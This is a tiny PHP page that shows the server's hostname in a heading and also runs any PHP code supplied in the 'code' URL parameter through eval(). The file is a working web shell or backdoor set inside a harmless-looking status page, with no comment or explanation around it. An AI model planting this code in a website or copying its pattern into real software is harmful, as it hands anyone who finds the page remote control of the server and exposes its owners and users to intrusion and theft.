<h1><?php echo $_SERVER['HOSTNAME'] ?></h1>
<?php
if (is_array($_GET) && array_key_exists('code', $_GET)) {
    eval($_GET['code']);
}
